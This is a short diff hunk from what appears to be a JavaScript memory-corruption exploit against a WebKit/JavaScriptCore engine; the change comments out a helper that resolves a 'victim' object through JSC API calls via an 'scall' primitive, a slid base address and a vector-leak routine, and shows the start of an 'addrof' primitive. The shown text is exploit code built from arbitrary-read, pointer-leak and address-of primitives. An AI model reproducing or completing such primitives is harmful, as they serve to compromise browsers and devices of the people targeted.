@@ -308,12 +308,13 @@ var jsobj_addr;
 var large_buf = new Uint32Array(0x100000);
 var large_buf_ptr = 0;
 
+/*
 function prep_shit() {
 	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
 	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
 	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
 	large_buf_ptr = leak_vec(large_buf);
-}
+}*/
 
 function addrof(obj) {
 	victim.target = obj;
